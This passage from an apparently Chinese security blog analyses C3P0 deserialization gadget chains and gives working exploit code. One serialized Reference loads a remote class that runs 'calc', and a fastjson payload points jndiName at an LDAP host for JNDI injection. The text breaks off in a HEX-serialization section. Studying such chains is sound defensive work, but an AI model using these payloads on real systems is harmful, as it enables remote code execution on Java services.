是一个 <code>ReferenceSerialized</code>  的构造方法</p><p>举个不是很恰当的例子<br> <code>ReferenceSerialized</code>  是 “加强版” 的 <code>ConnectionPoolDataSource</code></p><p>也就是说在序列化时，实际上的类进行了转换， <code>ConnectionPoolDataSource</code> -&gt; <code>ReferenceSerialized</code></p><p>再回到 <code>readobject</code>  调用的 <code>IndirectlySerialized.getobject</code> <br> 位于 <code>ReferenceIndirector</code> <br> <code>getObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    Context initialContext;</span><br><span class="line">    <span class="keyword">if</span> ( env == <span class="literal">null</span> )</span><br><span class="line">initialContext = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">initialContext = <span class="keyword">new</span> <span class="title class_">InitialContext</span>( env );</span><br><span class="line"></span><br><span class="line">    <span class="type">Context</span> <span class="variable">nameContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ( contextName != <span class="literal">null</span> )</span><br><span class="line">nameContext = (Context) initialContext.lookup( contextName );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ReferenceableUtils.referenceToObject( reference, name, nameContext, env ); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">catch</span> (NamingException e)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//e.printStackTrace();</span></span><br><span class="line">    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">logger.log( MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, e );</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>( <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + e.toString() );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是对环境变量上下文进行加载<br>我们关注 return 这里 <code>ReferenceableUtils.referenceToObject</code> ，跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">( Reference ref, Name name, Context nameCtx, Hashtable env)</span></span><br><span class="line"><span class="keyword">throws</span> NamingException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">fClassName</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line"><span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br><span class="line"></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">defaultClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span> ( defaultClassLoader == <span class="literal">null</span> ) defaultClassLoader = ReferenceableUtils.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">ClassLoader cl;</span><br><span class="line"><span class="keyword">if</span> ( fClassLocation == <span class="literal">null</span> )</span><br><span class="line">    cl = defaultClassLoader;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>( fClassLocation );</span><br><span class="line">cl = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>( <span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; u &#125;, defaultClassLoader );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">fClass</span> <span class="operator">=</span> Class.forName( fClassName, <span class="literal">true</span>, cl );</span><br><span class="line"><span class="type">ObjectFactory</span> <span class="variable">of</span> <span class="operator">=</span> (ObjectFactory) fClass.newInstance();</span><br><span class="line"><span class="keyword">return</span> of.getObjectInstance( ref, name, nameCtx, env );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">catch</span> ( Exception e )</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">if</span> (Debug.DEBUG) </span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//e.printStackTrace();</span></span><br><span class="line"><span class="keyword">if</span> ( logger.isLoggable( MLevel.FINE ) )</span><br><span class="line">    logger.log( MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">ne.setRootCause( e );</span><br><span class="line"><span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以控制 <code>fClassLocation</code> ，最后通过 <code>URLClassLoader</code>  并初始化该实例来实现恶意代码执行</p><h3 id="gadget"><a class="markdownIt-Anchor" href="#gadget">#</a> Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject-&gt;</span><br><span class="line">ReferenceIndirector#getObject-&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject-&gt;</span><br><span class="line">of(ObjectFactory)#getObjectInstance</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221455094.png" alt="在这里插入图片描述"></p><h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h3><p>这里有个 <code>getReference</code>  方法，直接返回一个 <code>Reference</code>  对象</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221457621.png" alt="image-20230522145742572"></p><p>我们可以通过该方法直接构造对象</p><p>这里我们获取 <code>ConnectionPoolDataSource</code>  类的私有属性，因为反序列化的是该类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>按照 <code>getReference</code>  方法再重写一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8002/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后是两个常规方法，序列化和反序列化，但这里我们还需要把构造好的 <code>connectionPoolDataSource</code>  替换成我们本地的 Calc<br> 所以这里再通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);  <span class="comment">//将对象进行修改</span></span><br></pre></td></tr></table></figure><p>并把它写在序列化入口，然后在反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8002/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(ConnectionPoolDataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(exp);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501061.png" alt="在这里插入图片描述"></p><p>本白一开始的傻帽操作，把文件放包下了，一直不能弹计算器，郁闷 (真傻</p><h2 id="jndi注入"><a class="markdownIt-Anchor" href="#jndi注入">#</a> JNDI 注入</h2><p><code>JndiRefForwardingDataSource</code>  的 <code>dereference()</code>  方法中有 look，并且 <code>jndiName</code>  通过 <code>getJndiName()</code>  获取，可造成 JNDI 注入<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501031.png" alt="在这里插入图片描述"><br>先看下 <code>getJnDIName</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getJndiName</span><span class="params">()</span></span><br><span class="line">&#123; <span class="keyword">return</span> (jndiName <span class="keyword">instanceof</span> Name ? ((Name) jndiName).clone() : jndiName <span class="comment">/* String */</span>); &#125;</span><br></pre></td></tr></table></figure><p>判断是否是 name 类型，不是则返回 String 类型</p><p>继续向上找可以利用的点<br> <code>inner()</code> <br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501728.png" alt="在这里插入图片描述"></p><p>找到 <code>setLoginRimeout</code> , 形参为 <code>int</code>  型<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501244.png" alt="在这里插入图片描述"></p><p>下面就是 <code>WrapperConnectionPoolDataSource</code>  和 <code>JndiRefConnectionPoolDataSource</code>  的同名函数<br>在 <code>JndiRefConnectionPoolDataSource</code> ， <code>setLoginTimeout</code> ，因为 <code>wcpds</code>  是 <code>WrapperConnectionPoolDataSource</code>  类下的，所以这里会调用 <code>WrapperConnectionPoolDataSource</code>  下的同名方法<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502080.png" alt="在这里插入图片描述"><br>这里会调用 <code>getNestedDataSource()</code>  对象<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502045.png" alt="在这里插入图片描述"><br>跟进后发现其实就是 <code>JndiRefForwardingDataSource</code> <br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502115.png" alt="在这里插入图片描述"><br>在下一步就知道到这里<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502232.png" alt="在这里插入图片描述"></p><p>后面就会去加载我们传入的 <code>jndiName</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502088.png" alt="在这里插入图片描述"></p><h3 id="gadget-2"><a class="markdownIt-Anchor" href="#gadget-2">#</a> Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502081.png" alt="在这里插入图片描述"></p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://10.6.42.156:8085/NpgoGBfd\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hex序列化"><a class="markdownIt-Anchor" href="#hex序列化">#</a> HEX 序列化</h2><p>在 <code>WrapperConnectionPoolDataSource</code>  的构造方法下</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503151.png" alt="在这里插入图片描述"><br>调用了 <code>C3P0ImplUtils.parseUserOverridesAsString</code></p><p>跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line"><span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line"><span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line"><span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当 <code>userOverridesAsString</code>  不为空进入 if<br> 首先会用 <code>substring</code>  对 <code>userOverridesAsString</code>  进行截取，将 <code>HASM_HEADER</code>  头和最后一位的；扣掉<br>而 <code>userOverridesAsString</code>  是一个私有的常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap&quot;</span>;</span><br></pre></td></tr></table></figure><p>将十六进制转成字节数组，最后再强转为 <code>map</code>  对象</p><p>跟进 `fromByteArray</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 